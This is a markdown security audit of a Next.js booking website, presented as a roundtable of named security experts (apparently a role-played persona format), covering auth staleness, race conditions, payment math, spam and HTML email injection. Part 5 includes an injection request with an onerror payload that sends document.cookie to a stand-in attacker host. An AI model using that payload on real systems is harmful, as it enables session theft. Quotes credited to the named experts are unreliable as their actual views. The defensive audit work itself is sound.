# RMASA Website — Expert Security Panel Audit

> Roundtable review of the Royal Masa Arena booking-website codebase by Bruce Schneier,
> Troy Hunt, James Kettle, Parisa Tabriz, and Simon Willison. Findings reference live code
> paths in `src/`, `prisma/schema.prisma`, `middleware.ts`, and `next.config.ts`.
>
> Scope: NextAuth + Cognito hybrid auth, admin RBAC, public booking endpoint,
> per-slot/payment admin flows, transactional email (Resend), contact webhook, secrets
> handling in Amplify SSR, and browser-side hardening.

## Remediation log

| Date | Finding | Status | Commit |
|---|---|---|---|
| 2026-05-18 | #1 — HTML email injection via unescaped customer/admin fields | **Fixed** — added `esc()` helper in `src/lib/email.ts` and wrapped all user/admin-supplied interpolations (`customerName`, `customerEmail`, `customerPhone`, `reference`, `roomName`, `eventTypeName`, `rejectReason`, per-slot `s.rejectReason`). | pending |
| 2026-05-18 | #2 — JWT role/active staleness | **Fixed** — both `requireAdmin()` and `requireSuperAdmin()` now re-read role + active from Postgres on every call. Inactive or demoted admins are rejected on the next request instead of waiting up to 4 hours for the JWT to expire. | pending |
| 2026-05-18 | #4 — Public booking endpoint spam | **Partially mitigated** — Cloudflare Turnstile bot protection is already in place on the booking form per `CLAUDE.md` § "Bot Protection: Cloudflare Turnstile". Remaining gaps: no length caps on customer fields, no per-IP rate limit at the edge. |  |
| 2026-05-19 | #4 — Public booking endpoint, length caps | **Fixed** — `src/app/api/calendar/bookings/route.ts` and `src/app/api/contact/route.ts` now enforce hard limits on customer-supplied fields: name ≤ 100, email ≤ 254 (RFC 5321), phone ≤ 16 (digits + `+` only via `PHONE_PATTERN`), purpose / message ≤ 1000. Rejected with a 400 before any DB write. Remaining gap on this finding: no per-IP rate limit at the edge (WAF). | pending |
| 2026-05-19 | #3 — Two-admin race in `updateCalendarDb` | **Fixed** — `updateCalendarDb` removed entirely. Replaced by focused helpers (`insertBookingWithCascade`, `updateBookingStatus`, `updateBookingSlotStatus`, `updateBookingSlotsBatch`, `createCalendarBlock`, `deleteCalendarBlock`, `replaceCalendarConfig`) that each touch only the rows they actually change. The override cascade is atomic with the primary booking write. `replaceCalendarConfig` is wipe-and-recreate scoped to the three config tables only, so config edits no longer race with booking-queue actions. Conflict-check-inside-transaction is a separate follow-up. | pending |
| 2026-05-19 | #5 — PaymentEntry net-collected math conflated waivers with cash | **Fixed** — extracted pure helpers to `src/lib/payments.ts` (`computePaymentTotals`, `computeAmountDue`, `deriveReconciliationStatus`) and wired them into `POST /api/admin/calendar/bookings/[id]/payments`. Two independent counters: `netCash` (payments − refunds) and `totalDeducted` (waivers + credit notes). `paidAmountLkr` now stores cash only; `reconciliationStatus` derives from `(netCash, totalAmountLkr − totalDeducted)`. Covered by 11 unit tests in `src/lib/payments.test.ts` (run via `npm test`). CLAUDE.md "Net collected" section rewritten. Residual: admin-queue Overpaid tag still uses `paidAmountLkr > totalAmountLkr`, which misses the "cash matches invoice + waiver applied later → refund due" case. Documented as follow-up. | pending |
>
> The product has **no AI surface and no file uploads today**, so Parts 4 and 5 are
> reframed as: (4) Public booking endpoint — spam, abuse, scraping; (5) Email rendering
> and HTML-injection trust boundaries. Simon Willison's contributions focus on
> forward-looking AI risk (if customer-note summarisation or admin-assist is added later)
> and on data-handling trust boundaries.

---

## Opening — first impressions

**Schneier.** Threat model first. Who attacks this site, and what do they want?

  - A **competitor or disgruntled customer** who wants to deny service: bot-spam the public
    booking endpoint, exhaust admin attention, fill the calendar with pending requests.
  - A **commercial scraper** who wants the pricing matrix or the customer list (the latter
    only via the admin surface, but the former is intentionally public).
  - An **insider** — an admin acting out of scope, or a former admin whose JWT is still
    valid after they were deactivated.
  - An **opportunist** who finds the site indexed somewhere and tries email-based social
    engineering against the admin via crafted customer-name fields in booking submissions.

The codebase has clearly been hardened against direct technical attacks. The places that
need work are the **integrity of the email channel** and the **freshness of authorisation
decisions**.

**Hunt.** OWASP shortlist. A01 broken access control — `requireAdmin`/`requireSuperAdmin`
are consistently applied across `src/app/api/admin/*`. A02 cryptographic failures —
nothing custom; NextAuth JWT signed with `NEXTAUTH_SECRET`. A03 injection — Prisma
parameterises SQL; the live injection surface is **HTML email construction** in
[`src/lib/email.ts`](src/lib/email.ts), where customer-supplied fields are interpolated
verbatim. A07 auth — Cognito holds passwords + lockout; Postgres holds role + active;
the seam is documented and the signIn callback enforces it. MFA is documented as deferred
in `CLAUDE.md` — call it out.

**Kettle.** I'll be looking at the public-write endpoints (`/api/calendar/bookings`,
`/api/contact`), the unauth GET endpoints that leak pricing/structure, the
wipe-and-recreate transaction pattern in [`calendar-store.ts:122–263`](src/lib/calendar-store.ts#L122-L263),
the payment-entry calculation, and the Cognito federated logout cache.

**Tabriz.** This codebase is small and the secret-leak prebuild guard
([`scripts/check-amplify-secret-leak.mjs`](scripts/check-amplify-secret-leak.mjs)) is the
kind of belt-and-suspenders I want to see. Defence-in-depth gaps I expect to find: no CSP,
no global rate limiting, JWT role-staleness across role/active changes, and the EmailLog
table storing rendered customer-PII HTML indefinitely.

**Willison.** No AI here, so my contribution is sparser than usual. I'll flag two things:
the **HTML-stored-in-DB** pattern (EmailLog.htmlBody) is the kind of "everything looks fine
until someone renders this in an admin UI later" that becomes XSS when AI-generated
summaries inevitably get added in v2. And the customer-name/reject-reason fields are
exactly the user-controlled text channel I'd worry about if any future feature pipes them
into a model.

---

## Part 1 — Authentication & Session Management

**Hunt.** [`middleware.ts`](middleware.ts) is short and correct:

  - Force HTTPS on `/admin/*` for non-localhost when `x-forwarded-proto === "http"`
    (lines 10–17). Amplify terminates TLS at the load balancer, so this header is
    authoritative.
  - `/admin/login` is whitelisted; everything else under `/admin/*` requires
    `getToken({ req, secret: NEXTAUTH_SECRET })`.
  - JWT session, 4 h `maxAge`, 15 min `updateAge` ([`auth.ts:6–13`](src/lib/auth.ts#L6-L13)).

The Cognito + Postgres hybrid in [`auth.ts:37–82`](src/lib/auth.ts#L37-L82) is exactly the
pattern I'd recommend, *but* it has a critical staleness issue:

**The role and `active` flag are stamped onto the JWT at sign-in and not re-validated.**
The `signIn` callback reads `dbUser.role` and `dbUser.active`, writes them to the JWT,
and `requireAdmin` ([`auth-guards.ts:15–33`](src/lib/auth-guards.ts#L15-L33)) trusts the
JWT-stamped role for the full 4-hour session. So:

  - A user demoted from `super_admin` to `admin` keeps `super_admin` privileges for up
    to 4 hours.
  - A user with `active: false` keeps logging in (or, more precisely, stays logged in)
    for up to 4 hours after deactivation.
  - There is **no revocation channel**. Cognito sign-out only invalidates the Cognito
    session; the NextAuth JWT remains valid until expiry.

For an admin product where you can deactivate someone via the UI, this is a high-severity
gap — the deactivate button promises something it doesn't deliver.

**Schneier.** The fix is either:

  1. Drop the JWT strategy and use database sessions, so every request hits Postgres.
     Cheap on Aurora; you're already round-tripping for `readCalendarDb`. Or
  2. Add a `session` callback (or a per-route wrapper around `requireAdmin`) that
     re-reads `User.role` and `User.active` from Postgres and rejects if either changed.
     Cache for 1–5 minutes if you want. The cost is one PK lookup per admin request.

Either way: the **deactivate** button must invalidate live sessions, or it shouldn't exist.

**Tabriz.** MFA. Per [`CLAUDE.md`](CLAUDE.md#auth) MFA is "currently off — deferred until
`royalmasarena.lk` is registered." That's a documented, accepted risk, but it does mean
every admin is single-factor. Cognito lockout helps against password-spray; it doesn't
help against phishing. Move MFA up the priority list; SES email MFA is fine as a starter,
and TOTP via authenticator app does not require domain verification.

**Kettle.** The federated logout at
[`auth/federated-logout/route.ts`](src/app/api/auth/federated-logout/route.ts) caches
`cachedLogoutEndpoint` at module scope (line 5). Two observations:

  1. If `COGNITO_ISSUER` is rotated post-deploy (e.g. user pool migration), the running
     Lambda keeps the stale endpoint until next cold start. Low severity.
  2. The endpoint discovery fetches `/.well-known/openid-configuration` with
     `cache: "no-store"` *but* the module-level cache renders that flag moot. Either
     decide it's cached (and add a TTL) or don't (and drop the cache). The current code
     is "cached forever per Lambda instance."

**Hunt.** `cognitoSub` backfill at first sign-in ([`auth.ts:69–75`](src/lib/auth.ts#L69-L75)):
the `sub` from the Cognito OAuth profile is written to Postgres the first time the user
logs in. **This is trust-on-first-use.** It relies on Cognito email uniqueness being
enforced at the user-pool level. Cognito does not enforce email uniqueness by default —
this is a config setting on the user pool. If a second Cognito account exists with the
same email (configurable, or via a different sign-in source), the first to log in claims
the Postgres row. Verify the user pool has `EMAIL` set as the alias-attribute with
uniqueness enforced. This is a one-line check in the Cognito console but a code-invisible
risk today.

**Schneier.** The 4-hour `maxAge` combined with `updateAge: 15 min` means a session
silently renews every 15 minutes of activity, so the effective ceiling is "until idle for
4 hours." For admin sessions touching financial data, I'd argue **2 hours** with no auto-
renewal — make the admin re-authenticate. That also bounds the role-staleness window.

---

## Part 2 — Authorisation & RBAC

**Tabriz.** The role model is two-tier: `admin` and `super_admin`. `requireSuperAdmin`
gates:

  - `POST/PATCH /api/admin/accounts/*` (admin account CRUD)
  - `PUT /api/admin/calendar/config` (rooms, event types, pricing)

`requireAdmin` gates everything else under `/api/admin/*`. The split is consistent and
readable.

**The last-super-admin guard** at
[`accounts/[id]/route.ts:43–57`](src/app/api/admin/accounts/[id]/route.ts#L43-L57) is well
done:

```ts
if (target.role === "super_admin" && removesSuperAdminCapability) {
  const otherActiveSuperAdminCount = await prisma.user.count({...});
  if (otherActiveSuperAdminCount === 0) {
    return NextResponse.json({ message: "Cannot remove the last active super admin..." });
  }
}
```

That prevents organisational lockout. The self-protection guards
([accounts/[id]/route.ts:32–41](src/app/api/admin/accounts/[id]/route.ts#L32-L41)) catch
self-deactivation and self-demotion.

**Kettle.** One IDOR-shaped issue worth checking: the `PATCH /api/admin/calendar/bookings`
batch path at [`bookings/route.ts:67–197`](src/app/api/admin/calendar/bookings/route.ts#L67-L197)
trusts `payload.id` plus `payload.batchSlotUpdates[].slotDate/slotStartTime` from the
request body to locate the rows to edit. The route correctly looks up `existing` by id
and only mutates slots inside that booking. **But there's no ownership check beyond
"admin role"** — any admin can patch any booking, regardless of who handled it earlier.
That's the intended model for a small business, but it means the AuditLog is your *only*
forensic trail. Confirm: every state-changing admin route is followed by
`logAuditEvent` — quick scan says yes for `/api/admin/calendar/bookings`,
`/api/admin/calendar/blocks`, `/api/admin/calendar/config`, `/api/admin/calendar/bookings/[id]/payments`,
`/api/admin/accounts/*`. Good.

**Hunt.** Two more authz observations:

  1. `/api/calendar/config` ([`calendar/config/route.ts`](src/app/api/calendar/config/route.ts))
     is unauth and returns the full pricing matrix. Acceptable for a public booking site
     (customers need prices to make decisions), but it does mean **price-extraction is
     trivial for competitors**. Decision, not a defect — flag for the business.
  2. `/api/calendar/availability` is also unauth and reveals all blocked slots, all
     existing bookings' time windows (through availability state). A scraper can map your
     occupancy. Same call — intentional, but worth being explicit.

**Schneier.** Insider threat: nothing in the codebase distinguishes "admin who handled the
original booking" from "any admin." If you grow to multiple admins, you'll want a
denormalised `handledByUserId` on `Booking` and per-admin filters on the queue. Today this
is fine for the operating model.

---

## Part 3 — API Security & Data Layer

**Kettle.** Five things to flag.

**1. The `updateCalendarDb` wipe-and-recreate pattern** at
[`calendar-store.ts:116–264`](src/lib/calendar-store.ts#L116-L264) is *atomic* (wrapped in
`prisma.$transaction(..., { timeout: 30_000 })`) but it's **read-modify-write at the
application layer**. Two simultaneous admin actions both call `readCalendarDb` separately,
mutate in memory, then enter the transaction. Inside the transaction it's serialised, but
*the snapshot each one mutated was read outside the transaction*. So:

  - Admin A reads (state S₀), starts to confirm booking X.
  - Admin B reads (state S₀), starts to reject slot in booking Y.
  - A's transaction runs first: delete-everything, insert-state-S₀-with-X-confirmed.
  - B's transaction runs next: delete-everything, insert-state-S₀-with-Y-rejected.
  - **A's confirmation is silently reverted.**

This is the classic last-write-wins on a snapshot. With one admin it's invisible. With
two it's a race against the wall clock. The mitigation is either:

  - Optimistic concurrency: add a `version` column to one row (a `CalendarMeta` singleton
    or each Booking); compare-and-swap inside the transaction.
  - Or: stop using wipe-and-recreate. The route's named operation is "confirm booking";
    write *just that* (`UPDATE booking SET status='confirmed', overriddenBookingIds=...`).
    The wipe-and-recreate pattern is documented in `CLAUDE.md` as "delete order matters
    for FK constraints" — that's a sign the data-access layer is too coarse.

This is high severity for a multi-admin org, even if it's invisible most days.

**2. Booking reference collision.**
[`bookings/route.ts:40–42`](src/app/api/calendar/bookings/route.ts#L40-L42):

```ts
function generateBookingReference(): string {
  return "BK-" + randomBytes(3).toString("hex").toUpperCase();
}
```

Three bytes = 24 bits = ~16.7 M values. The schema has `reference @unique`, so a
collision throws a Prisma uniqueness error and the booking POST returns a 500 to the
customer. At your current volume this is rare; at 10 k bookings the birthday-bound
collision probability is non-trivial (≈ 1 %). Retry on `P2002` or widen to 4 bytes.

**3. The PaymentEntry net-collected calculation is inconsistent with the schema docs.**
[`payments/route.ts:75–80`](src/app/api/admin/calendar/bookings/[id]/payments/route.ts#L75-L80):

```ts
const net = [...booking.paymentEntries, entry].reduce(
  (sum, e) => (e.type === "payment" ? sum + e.amountLkr : sum - e.amountLkr),
  0,
);
```

This subtracts *every non-payment type* — refunds, credit_notes, *and waivers*. Per
`CLAUDE.md` § Calendar Data Model: **Net collected = Σ(payment) − Σ(refund) − Σ(credit_note) − Σ(waiver)**.
The code matches the doc literally, but the doc itself is suspect: waivers don't reduce
cash collected; they reduce the *amount due*. Today a "Fee Waiver" entry on a fully-paid
booking would drop `paidAmountLkr` and change `reconciliationStatus` from `paid` to
something else — that's a money-relevant accounting error. Worth a Bruce-style "what does
the system actually mean by `paidAmountLkr`?" pass before you ship anything fancier.

This straddles security and financial-correctness. Severity depends on whether anyone has
actually used the `waiver` type yet — `CLAUDE.md` says "legacy value only going forward,"
which suggests it's been recognised. Confirm the recognition has reached the code.

**4. The wipe-and-recreate transaction runs many sequential INSERTs to Neon Singapore.**
30 s timeout, but each booking is a separate `await tx.booking.create(...)` plus
`createMany` for slots/breakdown/payments/overrides. With 200 bookings × 5 round-trips
each, you're at 1000 sequential round-trips. From Amplify (presumably us-east-1) to Neon
Singapore that's ~250 ms × 1000 = 4 minutes minimum. **The 30 s timeout will start firing
before you reach the documented volume.** Move to bulk operations or move the DB to the
same region as Amplify.

(That's an availability/operational finding more than a security one, but a route that
silently fails under load is a security problem when admins start working around it.)

**5. No pagination on `GET /api/admin/calendar/bookings`** — returns all bookings + slots
+ amountBreakdown + overrides + paymentEntries every time. Today it's fine; at 1k+
bookings the admin page slows down and the response gets large. Set a hard limit and let
the UI page.

**Schneier.** The transaction integrity issue (#1) is one of those bugs that looks like a
fluke when it bites: "weird, I confirmed that booking and it shows pending." Hard to
forensic after the fact. Get optimistic concurrency in before you hire a second admin.

---

## Part 4 — Public Booking Endpoint — Spam, Abuse, Scraping

**Hunt.** `POST /api/calendar/bookings` is unauthenticated by design. It writes a Booking
row, an email log row, and triggers two outbound Resend emails (acknowledgement + admin
notification). Per call cost: ~3 DB writes + 2 SMTP sends. There is **no rate limit, no
CAPTCHA, no proof-of-work, no honeypot field**.

That gives an attacker:

  - **Email bombing the admin inbox.** Submit 1000 forged bookings; admin gets 1000
    "New Booking Request" emails. ADMIN_NOTIFICATION_EMAIL is the inbox; saturating it
    has knock-on effects on real bookings being noticed.
  - **Resend cost amplification.** Resend is metered. A bot can run up the email bill.
  - **Calendar pollution.** Every submission is `status: "pending"` until an admin
    rejects it. The conflict-detection logic at
    [`evaluateBookingConflicts`](src/lib/calendar-core.ts) treats pending slots as
    blocking for new bookings of lower priority, so a bot can effectively block out
    high-value slots and force admin triage.
  - **Customer-PII pollution.** Booking rows accumulate forever with no cleanup. A
    spammer can dump 10 k garbage rows that an admin then has to manually clean.

The standard quick fixes:

  - **Per-IP rate limit** at the edge (Amplify CloudFront / WAF) — 5 requests / minute /
    IP. Amplify supports WAF rules natively; configure.
  - **Honeypot field** — render a hidden `<input name="company">` in the form; reject
    any submission that fills it. Catches naive bots, zero UX cost.
  - **hCaptcha / Cloudflare Turnstile** invisible challenge — costs an extra POST but
    catches scripted abuse.
  - **Hard length limits** on customer name (100), phone (40), email (254 — RFC), purpose
    (1000). Today none are enforced.

**Kettle.** Two enumeration vectors:

  - `GET /api/calendar/availability?roomTypeId=…&eventTypeId=…&date=YYYY-MM-DD` reveals
    occupancy state for any date. Loop dates, get a full calendar map. Intentional;
    flag for the business.
  - Booking *reference* values are partially predictable (6 hex chars). There's no
    customer-facing "check my booking status" endpoint today, so reference is internal.
    If you add one (and the email already shows the reference, so this is likely),
    **don't let it be a sole identifier** for sensitive operations — pair it with email
    + a one-time link.

**Schneier.** The fundamental insight: the public booking endpoint is a write that costs
the business money (Resend send + admin attention). Anything that costs money must have
a rate limit. The fact that the abuse cost is real (Resend) and small (a few cents) means
the right defence is *not* punitive — just deterrent. WAF rate limit + honeypot fixes
95 % of it.

**Hunt.** And while we're here: **`/api/contact`** is the same shape. Anonymous POST,
fires an HTTP webhook to `CONTACT_WEBHOOK_URL`. Same spam vectors. Add the same defences.

**Tabriz.** `CONTACT_WEBHOOK_URL` — the route at
[`contact/route.ts:41–66`](src/app/api/contact/route.ts#L41-L66) takes the URL from env
and POSTs to it with no signing key. If that webhook is downstream-CRM-grade, it should
require HMAC over the body to prove it came from your origin. Today, anyone who knows
the URL can submit fake leads. Sign with `crypto.createHmac('sha256', SHARED_SECRET).update(body)`.

---

## Part 5 — Email Rendering & HTML-Injection Trust Boundaries

**Hunt.** This is the headline finding.
[`src/lib/email.ts`](src/lib/email.ts) constructs HTML email bodies by template-literal
interpolation of customer-supplied fields. None of these fields are HTML-escaped:

  - `customerName` ([`email.ts:173, 243, 263, 297, 343, 381`](src/lib/email.ts#L173)) —
    customer-supplied via the public booking POST.
  - `customerEmail` (multiple places, including inside `mailto:` and visible link text) —
    customer-supplied.
  - `customerPhone` ([`email.ts:345`](src/lib/email.ts#L345)) — customer-supplied.
  - `rejectReason` ([`email.ts:236–239, 392`](src/lib/email.ts#L236-L239)) —
    admin-supplied via the rejection modal.
  - `roomName`, `eventTypeName` — admin-supplied via config.

`reference` is server-generated and safe. Slot date/time strings are validated. Amounts
are integers. The rest are typed `string` and arrive unescaped at the template literal.

Concrete attack:

```http
POST /api/calendar/bookings
{
  "customer": {
    "name": "Yasiru<style>body{display:none}</style><h1>URGENT: payment overdue</h1>",
    "email": "victim@example.com",
    "phone": "<img src=x onerror=fetch('https://attacker/?c='+document.cookie)>",
    ...
  }
}
```

What happens:

  1. The customer-acknowledgement email goes to `victim@example.com`. Most modern email
     clients strip scripts but **not all** — and many render inline CSS and `<img>`
     onload (Gmail web fetches images by default for known senders). At minimum: visual
     spoofing in the email body.
  2. The **admin-notification email** goes to `ADMIN_NOTIFICATION_EMAIL` containing the
     same unescaped HTML. The admin's mail client may render images; if the admin uses
     a self-hosted client without sandboxing, exploitable.
  3. **The entire HTML body is stored verbatim in `EmailLog.htmlBody`**
     ([`email.ts:141–152`](src/lib/email.ts#L141-L152)). If anyone — today or in v2 —
     renders that field in an admin UI, instant XSS on the admin session. There is no
     CSP today (see Part 8) to contain it.

**Fix:** HTML-escape every user-supplied string at the point of interpolation. A four-line
helper:

```ts
function esc(s: string | null | undefined): string {
  return String(s ?? "")
    .replaceAll("&", "&amp;").replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;").replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}
```

Then wrap every `${params.customerName}` → `${esc(params.customerName)}`, etc.

**Severity.** High. The admin-channel social-engineering surface alone justifies it. The
EmailLog-XSS-on-future-render is the latent landmine.

**Schneier.** The deeper point: storing rendered HTML in the database is a category
error. Store *structured data* (customer name, slot list, amounts) and render at view
time. If you ever need to re-render — for audit, for re-sending, for a CRM export —
structured data wins. HTML in the DB is undecidable.

**Kettle.** Two adjacent issues:

  - **No max-length on customer fields.** A 10 MB customer name is accepted, stored,
    and rendered. Combined with no rate limit, this is a DB-filler. Add length caps in
    the booking POST handler:
    `name <= 100`, `email <= 254`, `phone <= 40`, `purpose <= 1000`.
  - **The `mailto:` link** uses the customer email verbatim. A name like
    `legit@example.com?subject=ignore&cc=attacker@x.com` becomes a working URL that
    pre-populates a malicious mailto. Low severity but easy to escape.

**Willison.** A note on the future: if you ever add an "AI summarises this booking's
purpose" feature or a chatbot that reads recent bookings, **today's unescaped customer
fields become tomorrow's indirect prompt injection vector.** Fix the escaping now and
you've also pre-empted that. Same fix, two threat models.

---

## Part 6 — Third-Party Integrations

**Tabriz.** Three integrations: **AWS Cognito** (auth), **Resend** (email), **a generic
contact webhook**.

**Cognito.** Covered in Parts 1 and 2. Two open items: enforce email uniqueness on the
user pool, and turn on MFA before production scale.

**Resend.** The SDK client is correctly guarded:

```ts
const RESEND_API_KEY = process.env.RESEND_API_KEY ?? process.env._AMPLIFY_RESEND_API_KEY;
const resend = RESEND_API_KEY ? new Resend(RESEND_API_KEY) : null;
```

([`email.ts:5–6`](src/lib/email.ts#L5-L6)) — the null guard is essential because
`new Resend(undefined)` throws at module load and crashes every route that imports the
file (this is explicitly noted in `CLAUDE.md` as a previous incident). Good.

`RESEND_FROM` defaults to `onboarding@resend.dev` until the domain is verified. That
means **emails currently fail DMARC alignment for royalmasarena.lk** — customers' mail
servers will deliver to spam or reject. Operational issue, but worth flagging because
the `EmailLog` will show `status: sent` (Resend accepted it) even when downstream
delivery failed. There's no bounce-tracking. Treat Resend `sent` as "queued at the
provider," not "delivered."

**Hunt.** Once the domain is registered, configure **SPF**, **DKIM**, and **DMARC** with
`p=reject` (after a quarantine ramp). Without DMARC, the admin's customer can spoof
emails *from* `royalmasarena.lk` to phish their own admin.

**Tabriz.** **Contact webhook** at
[`contact/route.ts:48–66`](src/app/api/contact/route.ts#L48-L66) — POST to a URL from env
with no HMAC. As discussed in Part 4. Add HMAC. Also: the webhook receives `consent: true`
because the route validates it client-side, but there's no audit trail in *your* DB —
only the downstream CRM has the consent record. For GDPR/PDPA compliance evidence, store
the consent locally too.

**Kettle.** The webhook fetch has no timeout. A slow webhook holds the Lambda for the
full 60s default. Add `signal: AbortSignal.timeout(5_000)` to `fetch()`.

---

## Part 7 — Secrets & Infrastructure

**Tabriz.** Secrets inventory:

| Secret | Source | Files |
|---|---|---|
| `NEXTAUTH_SECRET` | env / `_AMPLIFY_NEXTAUTH_SECRET` | `auth.ts`, `middleware.ts` (via `getToken`) |
| `COGNITO_CLIENT_ID` / `_SECRET` / `_ISSUER` | env / `_AMPLIFY_*` | `auth.ts`, `federated-logout` |
| `DATABASE_URL` / `DIRECT_URL` | env / `_AMPLIFY_*` | `prisma.ts` (implied), schema |
| `RESEND_API_KEY` / `RESEND_FROM` | env / `_AMPLIFY_*` | `email.ts` |
| `ADMIN_NOTIFICATION_EMAIL` | env / `_AMPLIFY_*` | `email.ts` |
| `CONTACT_WEBHOOK_URL` | env (no `_AMPLIFY_` baking) | `contact/route.ts` |

The `_AMPLIFY_*` baking pattern is documented and consistently applied. The
[`check-amplify-secret-leak.mjs`](scripts/check-amplify-secret-leak.mjs) prebuild guard
enforces an allowlist of files that may reference `_AMPLIFY_*` and **fails the build**
otherwise. That's exactly the right control — it would have prevented several real
incidents I've seen at peer companies.

**Schneier.** Two upgrades worth doing:

  1. **The `CONTACT_WEBHOOK_URL` is read at runtime only** (no `_AMPLIFY_` baking). Per
     the project's CLAUDE.md note "env vars added in Amplify console do not take effect
     until next deployment" *and* "Amplify SSR Lambdas do not receive raw env vars at
     runtime via `process.env`." So unless `CONTACT_WEBHOOK_URL` is baked, the contact
     route in production silently falls into the dev branch
     ([`contact/route.ts:43`](src/app/api/contact/route.ts#L43)) and just `console.log`s
     enquiries. **Verify in production** — this is the kind of thing that lurks
     until someone asks "why aren't we getting contact leads?"

  2. **Rotation story for `NEXTAUTH_SECRET`.** Rotating invalidates all JWT sessions —
     that's a feature (admin lockout, force re-auth). But the rotation process should be
     documented: "rotate when you suspect compromise; users will be forced to sign in
     again." Today there's no runbook.

**Hunt.** No SDK-client-at-module-level landmines remaining. Prisma is correctly
singleton'd ([`prisma.ts`](src/lib/prisma.ts), per the CLAUDE.md pattern). Resend is
guarded. Cognito is via NextAuth provider. Clean.

**Kettle.** Two infra-shaped issues:

  - **Audit log IP capture** at e.g.
    [`bookings/route.ts:111–112`](src/app/api/admin/calendar/bookings/route.ts#L111-L112)
    uses `req.headers.get("x-forwarded-for")` directly. Amplify sets that to a
    comma-separated chain (`client, hop1, hop2`). You should take the leftmost value
    after trimming, *and* be aware that an unauthenticated request can append to the
    chain in some misconfigurations. For an internal admin route this is mostly
    cosmetic; document the format your audit log expects.

  - **Aurora min ACU 0** (per [`CLAUDE.md`](CLAUDE.md#aurora-serverless-v2-cold-start-min-acu-0))
    means cold-start latency 15–30 s. Mitigated for migrations via retry loop. At
    runtime, the **first booking POST after idle** can time out before the customer's
    email arrives. Not a security finding directly; an availability finding that becomes
    a security finding when customers double-submit and admins manually deduplicate.

---

## Part 8 — Browser-Side & Supply-Chain Risks

**Tabriz.** Security-header inventory from
[`next.config.ts:17–37`](next.config.ts#L17-L37):

  - `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` ✓
  - `X-Frame-Options: DENY` ✓
  - `X-Content-Type-Options: nosniff` ✓
  - `Referrer-Policy: strict-origin-when-cross-origin` ✓
  - `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()` ✓

That's the cleanest header set I've seen this audit cycle. **What's missing: a
Content-Security-Policy.** The Spark2Build audit yesterday found CSP issues; here you
have no CSP at all. The admin UI is a JSON-driven React app; a tight CSP is achievable.
Start with:

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
connect-src 'self';
frame-ancestors 'none';
form-action 'self';
base-uri 'none'
```

The `'unsafe-inline'` on `style-src` is the practical compromise for Tailwind generated
classes; everything else can be `'self'`. Critically, this would contain the
EmailLog-future-XSS scenario from Part 5 — if someone ever renders `htmlBody` in the
admin UI, `script-src 'self'` blocks injected scripts.

**Hunt.** No client-side analytics / session-replay / third-party JS evident. Clean.

**Kettle.** CSRF: NextAuth's session cookie is httpOnly, secure, SameSite=Lax by default.
Admin POSTs accept JSON; cross-origin JSON POST triggers a CORS preflight that the API
doesn't allow, so technically CSRF is blocked. **But** there's no explicit `Origin` check
on POSTs, so a same-site subdomain (e.g. if you ever add `marketing.royalmasarena.lk`
that supports user content) becomes a CSRF source. Defence-in-depth: add an Origin
header check on state-changing routes, allow only `NEXTAUTH_URL` origin.

**Schneier.** Supply chain: this is a small dependency set. NextAuth, Prisma, Resend,
React. Run `npm audit --production` on every release; pin to specific versions; add
Dependabot. Particularly watch **NextAuth** — the v4 → v5 migration has security
implications and the version you're on (whatever Next 15 expects) should be on the
supported branch.

---

## Conclusions

**Hunt.** My top three:

  1. **HTML email injection** via unescaped customer fields (`customerName`, `customerEmail`,
     `customerPhone`, `rejectReason`) interpolated into both customer-facing and
     admin-facing emails, plus stored in `EmailLog.htmlBody`. High severity, low effort.
  2. **JWT role/active staleness** — `requireAdmin` trusts the JWT-stamped role for up to
     4 hours after deactivation. The deactivate button is misleading.
  3. **No rate limit / no CAPTCHA / no length caps on the public booking endpoint.**
     Email-bomb the admin, fill the calendar, run up Resend bill.

**Kettle.** My top three:

  1. **`updateCalendarDb` read-modify-write race** between two admins acting on stale
     snapshots silently reverts the loser's work.
  2. **PaymentEntry net-collected math** subtracts waivers from cash collected — that's
     either a bug or a doc error; either way it touches money.
  3. **Booking reference 24-bit collision** turns into 500-error UX at scale.

**Tabriz.** Defence-in-depth:

  1. Add CSP — contains the EmailLog future-XSS scenario.
  2. Enforce Cognito email uniqueness at the user-pool level.
  3. Move MFA up the priority list — TOTP doesn't need domain verification.
  4. Verify `CONTACT_WEBHOOK_URL` is actually reaching production (baked via
     `_AMPLIFY_*` or set as a runtime-readable var).

**Schneier.** Conceptual cleanups:

  1. Stop storing rendered HTML in `EmailLog.htmlBody`; store structured data.
  2. Replace JWT-stamped authorisation with per-request Postgres lookups (or short
     session caches) — deactivation must be immediate.
  3. Replace `updateCalendarDb` wipe-and-recreate with targeted writes + optimistic
     concurrency. The current pattern produces an audit log that doesn't reflect the
     actual *intent* of admin actions.

**Willison.** No AI today. The most important pre-AI hygiene: **don't put user-supplied
text into shared canonical-form blobs.** That's the lesson from the email-HTML issue and
it's the lesson that will save you from indirect prompt injection when you eventually
add a "summarise this booking" feature.

---

## Findings Table

| # | Finding | OWASP | Severity | Effort | Expert(s) |
|---|---|---|---|---|---|
| 1 | ~~Customer-supplied `customerName`, `customerEmail`, `customerPhone` and admin-supplied `rejectReason` interpolated into HTML emails without escaping ([email.ts](src/lib/email.ts)). Also stored verbatim in `EmailLog.htmlBody`. Admin social-engineering + latent XSS if `htmlBody` is ever rendered in an admin UI.~~ **Fixed 2026-05-18** — see Remediation log. | A03 | **High** | Low | Hunt, Willison |
| 2 | ~~JWT-stamped `role` and `active` are trusted for the full 4 h session~~ ([auth.ts:84–100](src/lib/auth.ts#L84-L100), [auth-guards.ts:15–33](src/lib/auth-guards.ts#L15-L33)). ~~Deactivation and role-demotion don't take effect until session expiry; no revocation channel.~~ **Fixed 2026-05-18** — see Remediation log. | A01 / A07 | **High** | Medium | Hunt, Schneier |
| 3 | ~~`updateCalendarDb` read-modify-write at the application layer~~ ([calendar-store.ts:116–264](src/lib/calendar-store.ts#L116-L264)): ~~two concurrent admin actions on stale snapshots → last writer silently reverts the other's work. No optimistic concurrency.~~ **Fixed 2026-05-19** — `updateCalendarDb` removed; replaced by targeted-write helpers. See Remediation log. | A08 | **High** | High | Kettle |
